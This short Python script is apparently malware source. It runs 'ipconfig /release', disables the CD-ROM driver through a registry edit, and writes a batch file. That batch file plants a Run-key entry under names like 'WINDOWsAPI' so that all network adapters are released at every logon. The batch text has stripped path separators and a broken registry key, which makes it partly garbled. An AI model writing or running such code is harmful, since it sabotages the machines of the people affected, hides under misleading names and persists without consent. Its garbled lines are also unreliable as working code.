import os

disa='''echo @echo off>c:windowswimn32.bat
echo break off>>c:windowswimn32.bat
echo ipconfig/release_all>>c:windowswimn32.bat
echo end>>c:windowswimn32.bat reg
add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v WINDOWsAPI /t reg_sz /d :windowswimn32.bat /f reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
echo Disable ! PAUSE'''

text='Ipconfig /release'
text1='reg add HKLM\System\CurrentControlSet\Services\cdrom /t REG_DWORD /v "Start" /d 4 /f' #reg add HKLM\System\CurrentControlSet\Services\cdrom /t REG_DWORD /v "Start" /d 1 /f
os.system(f'cmd /k {text}') 
os.system(f'cmd /k {text1}')
f=open("bye.bat","w")
f.write(disa)
f.close()